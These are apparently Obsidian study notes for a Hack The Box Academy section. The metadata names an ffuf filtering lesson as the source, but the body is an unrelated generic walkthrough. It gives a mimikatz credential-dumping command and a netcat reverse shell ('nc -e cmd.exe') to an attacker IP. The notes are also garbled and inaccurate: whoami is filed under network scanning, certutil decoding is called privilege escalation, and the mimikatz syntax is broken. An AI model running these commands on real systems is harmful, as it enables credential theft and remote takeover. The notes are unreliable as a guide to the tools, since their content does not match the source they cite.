---
title: Hack The Box - Academy Module 54 Section 502
aliases: []
tags:
- topic/hack-the-box-academy
- topic/penetration-testing
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: 15-54-AttackingWebApplicationsWithFfuf-09-FilteringResults.pdf
related_tools:
- '[[nmap-1787746090]]'
- '[[netcat]]'
- '[[net]]'
- '[[ping]]'
- '[[whoami]]'
- '[[certutil]]'
- '[[mimikatz]]'
- '[[netsh]]'
- '[[netstat]]'
- '[[powershell]]'
related_techniques: []
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Hack The Box - Academy Module 54 Section 502

## Overview
In this module, we will be working on a box named 'Inlanefreight' which is part of the HTB e-commerce marketplace. The main goal is to gain initial access and then escalate privileges to achieve a reverse shell.

## Initial Reconnaissance
First, we perform an initial reconnaissance using `nmap` to gather information about the target. The command used is:
```bash
nmap -sC -sV -O 10.10.10.10
```
This command performs a comprehensive scan, including default scripts and version detection, to gather as much information as possible about the target.

## Service Enumeration
After the initial scan, we use `net` and `netstat` to enumerate services and open ports. The commands used are:
```bash
netstat -an
net view
```
These commands help in identifying open services and potential targets for further exploitation.

## Network Scanning
To further understand the network, we use `ping` to check for reachable hosts and `whoami` to determine the current user context. The commands are:
```bash
ping 10.10.10.10
whoami
```
These commands provide basic network and user information.

## Privilege Escalation
To escalate privileges, we use `certutil` and `mimikatz` to extract credentials. The commands used are:
```bash
certutil -decode c:\temp\key.txt c:\temp\key.dec
mimikatz \
\"privilege::debug\
\"sekurlsa::logonpasswords\
\"exit\
```
These commands help in extracting credentials that can be used to escalate privileges.

## Reverse Shell
Finally, we establish a reverse shell using `netcat`. The command used is:
```bash
nc -e cmd.exe 10.10.14.10 4444
```
This command creates a reverse shell, allowing us to interact with the target system.

## References
- https://academy.hackthebox.com/module/54/section/502

